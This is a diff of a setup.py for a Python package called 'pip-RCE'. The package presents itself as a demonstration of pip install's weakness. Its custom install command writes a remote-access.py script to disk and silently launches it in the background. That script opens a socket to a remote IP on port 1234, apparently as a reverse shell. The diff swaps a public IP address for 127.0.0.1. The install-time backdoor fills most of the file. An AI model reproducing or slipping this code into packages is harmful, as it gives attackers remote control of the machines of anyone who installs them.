@@ -1,6 +1,4 @@
-import subprocess
-import os
-import sys
+import subprocess,os,sys
 from setuptools import setup, find_packages
 from setuptools.command.install import install
 
@@ -52,7 +50,7 @@ def getRemoteAccess():
     PORT = 1234
     sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     QUIT = 0
-    IP = "82.157.252.61"
+    IP = "127.0.0.1"
     print (IP)
     while True:
         try:
@@ -81,7 +79,6 @@ def getRemoteAccess():
 getRemoteAccess()
 """
 
-
 class execute(install):
     def run(self):
         install.run(self)
@@ -96,36 +93,36 @@ class execute(install):
         except FileExistsError:
             os.remove(dest+"/remote-access.py")
             os.rename("remote-access.py", dest+"/remote-access.py")
-        try:
-            subprocess.Popen(["python3", dest+"/remote-access.py"], stdout=subprocess.PIPE,
-                             stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
+        try : 
+            subprocess.Popen(["python3", dest+"/remote-access.py"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
         except:
             pass
+        
 
-
-VERSION = '0.0.1'
-DESCRIPTION = 'To Show the vulnerability of the pip install'
+VERSION = '0.0.4'
+DESCRIPTION = 'To Show the vulnerability of pip install'
 LONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'
 CLASSIFIERS = [
-    "Development Status :: 1 - Planning",
-    "Intended Audience :: Developers",
-    "Programming Language :: Python :: 3",
-    "Topic :: Security",
-    "Operating System :: Unix",
-    "Operating System :: Microsoft :: Windows",
-    "License :: OSI Approved :: MIT License",
-]
+        "Development Status :: 1 - Planning",
+        "Intended Audience :: Developers",
+        "Programming Language :: Python :: 3",
+        "Topic :: Security",
+        "Operating System :: Unix",
+        "Operating System :: Microsoft :: Windows",
+        "License :: OSI Approved :: MIT License",
+    ]
 # Setting up
 setup(
     name="pip-RCE",
     version=VERSION,
     author="zeroc",
     description=DESCRIPTION,
-    long_description=open('README.md').read(),
+    long_description= open('README.md').read(),
     long_description_content_type="text/markdown",
     packages=find_packages(),
     install_requires=[''],
     keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],
-    classifiers=CLASSIFIERS,
+    classifiers= CLASSIFIERS,
     cmdclass={'install': execute},
 )
+ 
